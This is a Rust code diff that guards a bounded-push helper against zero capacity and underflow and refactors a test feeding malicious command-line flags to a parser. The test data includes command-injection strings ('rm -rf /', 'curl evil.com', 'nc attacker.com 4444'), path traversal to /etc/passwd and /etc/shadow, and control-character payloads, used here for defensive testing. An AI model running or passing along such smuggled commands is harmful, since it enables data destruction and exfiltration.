@@ -1186,8 +1186,11 @@ fn compute_trust_proof_digest(
 }
 
 fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
+    if cap == 0 {
+        return;
+    }
     if items.len() >= cap {
-        let overflow = items.len() - cap + 1;
+        let overflow = items.len().saturating_sub(cap).saturating_add(1);
         items.drain(0..overflow);
     }
     items.push(item);
@@ -3218,39 +3221,47 @@ mod tests {
         // Test command line flag parsing against injection and malformed input
         let malicious_flag_sets = vec![
             // Buffer overflow attempts
-            vec!["--".repeat(1000).as_str()],
-            vec!["--safe-mode", "--".repeat(500).as_str()],
+            vec!["--".repeat(1000)],
+            vec!["--safe-mode".to_string(), "--".repeat(500)],
 
             // Null byte injection
-            vec!["--safe-mode\0--degraded"],
-            vec!["--read-only", "\0", "--no-network"],
+            vec!["--safe-mode\0--degraded".to_string()],
+            vec![
+                "--read-only".to_string(),
+                "\0".to_string(),
+                "--no-network".to_string(),
+            ],
 
             // Unicode and control character injection
-            vec!["--safe-mode🚀"],
-            vec!["--degraded\u{200B}"],
-            vec!["--read-only\r\n--no-network"],
-            vec!["--safe-mode\x1B[H\x1B[2J"],
+            vec!["--safe-mode🚀".to_string()],
+            vec!["--degraded\u{200B}".to_string()],
+            vec!["--read-only\r\n--no-network".to_string()],
+            vec!["--safe-mode\x1B[H\x1B[2J".to_string()],
 
             // Path traversal and injection attempts
-            vec!["--safe-mode", "../../../etc/passwd"],
-            vec!["--degraded", "--config=/etc/shadow"],
+            vec!["--safe-mode".to_string(), "../../../etc/passwd".to_string()],
+            vec!["--degraded".to_string(), "--config=/etc/shadow".to_string()],
 
             // Script injection attempts
-            vec!["--safe-mode; rm -rf /"],
-            vec!["--degraded && curl evil.com"],
-            vec!["--read-only | nc attacker.com 4444"],
+            vec!["--safe-mode; rm -rf /".to_string()],
+            vec!["--degraded && curl evil.com".to_string()],
+            vec!["--read-only | nc attacker.com 4444".to_string()],
 
             // Extremely long arguments
-            vec![&"--safe-mode-".repeat(10000)],
-            vec!["--degraded", &"x".repeat(1024 * 1024)],
+            vec!["--safe-mode-".repeat(10000)],
+            vec!["--degraded".to_string(), "x".repeat(1024 * 1024)],
 
             // Binary data injection
-            vec![&String::from_utf8_lossy(&[0x00, 0x01, 0x02, 0x03, 0x04])],
-            vec!["--safe-mode", &String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD])],
+            vec![String::from_utf8_lossy(&[0x00, 0x01, 0x02, 0x03, 0x04]).into_owned()],
+            vec![
+                "--safe-mode".to_string(),
+                String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD]).into_owned(),
+            ],
         ];
 
         for (i, malicious_flags) in malicious_flag_sets.iter().enumerate() {
-            let parse_result = OperationFlags::parse_args(malicious_flags);
+            let malicious_refs = malicious_flags.iter().map(String::as_str).collect::<Vec<_>>();
+            let parse_result = OperationFlags::parse_args(&malicious_refs);
 
             match parse_result {
                 Ok(flags) => {
